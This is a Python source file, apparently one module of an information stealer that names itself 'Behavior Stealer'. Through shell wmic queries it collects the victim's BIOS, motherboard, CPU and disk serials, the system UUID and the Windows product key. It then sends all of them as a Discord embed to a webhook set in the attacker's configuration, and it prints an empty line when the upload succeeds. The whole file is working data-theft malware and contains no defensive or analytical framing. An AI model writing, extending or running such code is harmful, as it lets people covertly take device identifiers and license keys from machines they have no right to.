import subprocess
import requests

def wmic_query(cmd):
    try:
        output = subprocess.check_output(cmd, shell=True, text=True)
        lines = output.strip().splitlines()
        if len(lines) >= 2:
            return lines[1].strip()
        return "Unknown"
    except Exception as e:
        return f"Error: {e}"

def get_all_serials():
    serials = {
        "BIOS Serial": wmic_query("wmic bios get serialnumber"),
        "Motherboard Serial": wmic_query("wmic baseboard get serialnumber"),
        "System UUID": wmic_query("wmic csproduct get uuid"),
        "Processor ID": wmic_query("wmic cpu get processorid"),
        "Hard Drive Serial": wmic_query("wmic diskdrive get serialnumber"),
        "Windows Product Key": wmic_query("wmic path softwarelicensingservice get OA3xOriginalProductKey")
    }
    return serials

def send_embed_to_discord(serials: dict):
    webhook_url = Behavior
    if not webhook_url:
        print("[-] Webhook URL (Behavior) not set in config")
        return

    fields = []
    for name, value in serials.items():
        fields.append({
            "name": name,
            "value": value if value else "Unknown",
            "inline": False
        })

    embed = {
        "title": "🛠️ System Serials Information",
        "color": 0x00FFFF,  
        "fields": fields
    }

    data = {
        "embeds": [embed],
        "avatar_url": "https://cdn.discordapp.com/attachments/1375534863049822279/1383070822603817100/logo.png",
        "username": "Behavior Stealer"
    }

    try:
        response = requests.post(webhook_url, json=data)
        if response.status_code in (200, 204):
            print("")
        else:
            print(f"[-] Webhook error: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"[-] Exception while sending to webhook: {e}")

def run():
    serials = get_all_serials()
    send_embed_to_discord(serials)

if __name__ == "__main__":
    run()
